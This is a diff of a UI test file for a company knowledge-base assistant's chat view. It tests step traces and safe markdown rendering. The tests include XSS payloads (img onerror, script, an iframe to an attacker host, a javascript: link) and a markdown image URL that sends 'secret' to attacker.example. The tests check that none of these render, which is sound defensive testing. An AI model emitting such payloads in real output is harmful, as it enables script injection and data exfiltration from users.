@@ -113,14 +113,16 @@ describe("answer states", () => {
   })
 })
 
-describe("the steps panel", () => {
-  const steps = [{ id: "s1", label: "Searching company docs", result: "found 1 relevant document", done: true }]
+describe("the steps trace", () => {
+  const steps = [
+    { id: "s1", tool: "search_docs", label: "Searching company docs", result: "found 1 relevant document", done: true },
+  ]
 
-  it("shows the raw tool input only when the server sent it (admins)", async () => {
+  it("folds a finished answer's steps into one line, and shows no raw tool input to members", async () => {
     show({ state: "answered", text: "ok", steps, trace: [{ tool: "search_docs" }] })
     const user = userEvent.setup()
-    await user.click(screen.getByText("1 step"))
-    expect(screen.getByText("Searching company docs")).toBeInTheDocument()
+    await user.click(screen.getByRole("button", { name: /Searched company docs · 1 document/ }))
+    expect(screen.getByText("found 1 relevant document")).toBeInTheDocument()
     expect(screen.queryByText("Technical details")).not.toBeInTheDocument()
   })
 
@@ -133,10 +135,138 @@ describe("the steps panel", () => {
       trace: [{ tool: "search_docs", input: { question: "refund" }, output: "Refunds..." }],
     })
     const user = userEvent.setup()
-    await user.click(screen.getByText("1 step"))
+    await user.click(screen.getByRole("button", { name: /Searched company docs/ }))
     expect(screen.getByText("How long does a refund take?")).toBeInTheDocument()
     await user.click(screen.getByText("Technical details"))
-    expect(screen.getByText(/input: \{"question":"refund"\}/)).toBeInTheDocument()
+    expect(screen.getByText(/"question": "refund"/)).toBeInTheDocument()
+  })
+
+  it("says what it is doing while it thinks, before any step", () => {
+    show({ streaming: true, status: "Checking your question", steps: [] })
+    expect(screen.getByRole("status")).toHaveTextContent("Reading the question")
+    expect(screen.queryByText(/Thinking/)).not.toBeInTheDocument()
+  })
+
+  it("shows each step live: running, then done, with the thinking line following it", () => {
+    show({
+      streaming: true,
+      steps: [
+        { ...steps[0], startedAt: 0, ms: 800 },
+        { id: "s2", tool: "search_outline", label: "Searching the Outline wiki for “leave”", done: false, startedAt: 5 },
+      ],
+    })
+    expect(screen.getByText("Searched company docs")).toBeInTheDocument()
+    expect(screen.getByText("found 1 relevant document · 0.8s")).toBeInTheDocument()
+    expect(screen.getByText("Running:")).toBeInTheDocument()
+    expect(screen.getAllByText("Searching the Outline wiki for “leave”").length).toBeGreaterThan(0)
+    expect(screen.getByRole("status")).toHaveTextContent("Searching the Outline wiki for “leave”")
+  })
+
+  it("folds the steps once the answer starts streaming", () => {
+    show({ streaming: true, text: "Refunds take", steps: [{ ...steps[0], startedAt: 0, ms: 1200 }] })
+    const summary = screen.getByRole("button", { name: /Searched company docs · 1 document · 1.2s/ })
+    expect(summary).toHaveAttribute("aria-expanded", "false")
+    expect(screen.queryByRole("status")).not.toBeInTheDocument()
+  })
+
+  it("marks a step stopped mid-way as stopped, not done", async () => {
+    show({
+      state: "stopped",
+      text: "",
+      // Stop marks every step done, with no result.
+      steps: [{ id: "s1", tool: "search_docs", label: "Searching company docs", done: true }],
+    })
+    await userEvent.setup().click(screen.getByRole("button", { name: /Stopped/ }))
+    expect(screen.getByText("Stopped while searching company docs")).toBeInTheDocument()
+    expect(screen.queryByText("Done:")).not.toBeInTheDocument()
+  })
+
+  it("says when a step was blocked or failed", async () => {
+    show({
+      state: "blocked",
+      text: "Staff salary information is restricted to HR / Admin.",
+      steps: [{ ...steps[0], result: "blocked by access rules" }],
+    })
+    await userEvent.setup().click(screen.getByRole("button", { name: /Blocked by access rules/ }))
+    expect(screen.getByText("Blocked while searching company docs")).toBeInTheDocument()
+  })
+
+  it("shows members only the thinking line when an admin turned the steps off", () => {
+    show({ streaming: true, steps: [] }, { hideSteps: true })
+    expect(screen.getByRole("status")).toHaveTextContent("Reading the question")
+    show({ streaming: true, text: "Refunds", steps: [] }, { hideSteps: true })
+    expect(screen.queryAllByRole("button", { name: /Searched/ })).toHaveLength(0)
+  })
+})
+
+describe("the answer's markdown", () => {
+  it("renders no raw HTML: no image, script or frame from the answer's text", () => {
+    const { container } = render(
+      withProviders(
+        <AssistantMessage
+          message={{
+            key: "a1",
+            id: "m1",
+            role: "assistant",
+            state: "answered",
+            text: 'Hi <img src=x onerror="alert(1)"> there <script>alert(2)</script><iframe src="https://attacker"></iframe> end',
+          }}
+          actions={{}}
+        />,
+      ),
+    )
+    expect(container.querySelector("img, script, iframe")).toBeNull()
+    // The tags are dropped; what was between them is inert text.
+    expect(container).toHaveTextContent(/Hi\s+there\s+alert\(2\)\s+end/)
+  })
+
+  it("shows a markdown image as its alt text and never loads it", () => {
+    show({ state: "answered", text: "See ![secret chart](https://attacker.example/?q=secret)." })
+    expect(document.querySelector("img")).toBeNull()
+    expect(screen.getByText("[secret chart]")).toBeInTheDocument()
+  })
+
+  it("doesn't make a javascript: link live", () => {
+    show({ state: "answered", text: "[click me](javascript:alert(1))" })
+    const link = screen.getByText("click me").closest("a")
+    expect(link?.getAttribute("href") ?? "").not.toMatch(/javascript:/i)
+  })
+
+  it("renders a table with the app's table, and code as a code block", () => {
+    show({ state: "answered", text: "| Plan | Days |\n| --- | --- |\n| Basic | 18 |\n\n```\nline one\n```" })
+    expect(screen.getByRole("table")).toBeInTheDocument()
+    expect(screen.getByRole("cell", { name: "18" })).toBeInTheDocument()
+    expect(document.querySelector("[data-slot=code-block]")).toHaveTextContent("line one")
+  })
+
+  it("fades words in while streaming, with a caret, and leaves plain text once done", () => {
+    const { rerender } = render(
+      withProviders(
+        <AssistantMessage message={{ key: "a1", role: "assistant", text: "Refunds take thirty", streaming: true }} actions={{}} />,
+      ),
+    )
+    expect(document.querySelectorAll(".kb-word")).toHaveLength(3)
+    expect(document.querySelector(".kb-caret")).toHaveAttribute("aria-hidden", "true")
+    rerender(
+      withProviders(
+        <AssistantMessage
+          message={{ key: "a1", id: "m1", role: "assistant", text: "Refunds take thirty days.", state: "answered" }}
+          actions={{}}
+        />,
+      ),
+    )
+    expect(screen.getByText("Refunds take thirty days.")).toBeInTheDocument()
+    expect(document.querySelector(".kb-word, .kb-caret")).toBeNull()
+  })
+
+  it("animates nothing on an answer loaded from history", () => {
+    show({
+      state: "answered",
+      text: "Refunds take 30 days [S1].",
+      sources: [{ n: 1, title: "refund.md", provider: "Company documents", url: null, chunk_id: "c1", snippet: "x" }],
+      followups: ["And returns?"],
+    })
+    expect(document.querySelector(".kb-pop, .kb-rise, .kb-fade, .kb-line-in, .kb-word")).toBeNull()
   })
 })
 
